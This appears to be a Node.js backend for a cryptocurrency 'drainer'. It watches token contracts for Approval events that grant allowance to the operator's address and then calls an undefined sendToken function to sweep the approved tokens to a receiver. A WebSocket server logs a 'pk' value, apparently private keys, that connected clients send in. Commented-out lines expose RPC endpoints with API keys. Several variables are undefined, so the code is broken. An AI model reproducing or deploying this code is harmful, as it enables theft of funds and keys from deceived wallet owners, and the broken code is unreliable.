var argv = require('minimist')(process.argv.slice(2));
const fs = require("fs")
var { log, logSuccess, logError, logWaning, COLOR } = require("./std");
const clc = require("cli-color")

const { WebSocketServer } = require('ws');

const Web3 = require("web3")
const HDWalletProvider = require("@truffle/hdwallet-provider");
const CHAINS = require("./CHAINS");

var privateKey = argv.k.trim();

var spender = (new Web3()).eth.accounts.privateKeyToAccount(privateKey).address
var receiver = spender

if (argv.receiver) receiver = argv.receiver.trim();

logWaning("spender", spender)
logWaning("receiver", receiver)

// log(privateKey)
// log(COLOR.Clear);

async function loadSettings(file = "settings.json") {
    let content = fs.readFileSync(file, "utf8");
    let settings = JSON.parse(content)
    receiver = settings.receiver
    return settings;

}

async function saveSettings(settings, file = "settings.json") {
    let content = JSON.stringify(settings)
    fs.writeFileSync(file, content, "utf8");
}

function loadQuicknode(file = "quicknode.json") {
    let content = fs.readFileSync(file, "utf8")
    return JSON.parse(content)
}

function sendMessageClient(message, allClient = true, clientId = 0) {
    if (allClient) {
        clients.forEach(ws => {
            ws.send(JSON.stringify(message))
        });
    }
}

function listenEvents(settings) {
    let { tokens, abiFolder } = settings
    let web3s = []
    let contracts = []
    let quicknode = loadQuicknode()
    Object.keys(tokens).map(symbol => {
        Object.keys(tokens[symbol]).map(async id => {
            let chainId = parseInt(id)
            let abiPath = abiFolder + symbol + "_ABI_" + chainId + ".json"
            // log(abiPath, fs.existsSync(abiPath), symbol, chainId)
            let abi = JSON.parse(fs.readFileSync(abiPath, "utf-8"))

            if (chainId === 1337 || chainId === 5777) {
                abi = abi.abi; chainId = 5777;
            }
            let rpc = quicknode[chainId].link

            let provider;
            if (rpc.startsWith("ws")) {
                provider = new Web3.providers.WebsocketProvider(rpc)
            } else {
                provider = new Web3(rpc)
            }

            let web3 = new Web3(provider)
            web3.eth.accounts.wallet.add(privateKey)

            let contract = new web3.eth.Contract(abi, tokens[symbol][chainId].address)
            contract.events.Approval({ filter: { "spender": spender } }, (error, event) => {
                if (error) logError(symbol, chainId, error)
                else {
                    logSuccess(chainId, symbol)
                    log(event.returnValues)

                    sendMessageClient({
                        onApproval: {
                            chainId: chainId,
                            symbol: symbol,
                            value: event.returnValues
                        }
                    })
                    sendToken(contract, from, to)
                }
            })

            web3s.push(web3)
            contracts.push(contract)
        })
    })
    return web3s, contracts;
}


loadSettings()
    .then(settings => {
        let web3s, contracts = listenEvents(settings)
    })
// .catch(error => logError(error))
var port = 8080;
if (argv.port) port = argv.port.trim();
else if (argv.p) port = argv.p;

var clients = []

const wss = new WebSocketServer({ port: port });

wss.on('connection', (ws) => {
    clients.push(ws)
    let id = clients.length
    logSuccess(id, 'connections')
    ws.on('message', (data) => {
        let msg = JSON.parse(data)

        console.log("%s: %s", id, msg.pk);
        sendMessageClient({ "message": "hi " + id })
    });

    ws.send("hello");
    ws.onclose = (e) => {
        clients.slice(id, 1)
        logError("onclose ws " + id)
    }
});

/*  */


/* test create web3 and listen event */
// let web3 = new Web3(new Web3.providers.WebsocketProvider("wss://winter-muddy-cloud.discover.quiknode.pro/d146c8fcb93455ee90fe69422a012137e6eb28c3/"))
// // let web3 = new Web3("https://mainnet.infura.io/v3/d41e02ee7f344eb6ba4b9239f853de51")
// let abi = JSON.parse(fs.readFileSync("public/contracts/USDC_ABI_1.json"))
// let contract = new web3.eth.Contract(abi, "0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF")
// contract.events.Approval({}, (err, event) => {
//     if (err) throw err
//     log(event)
// })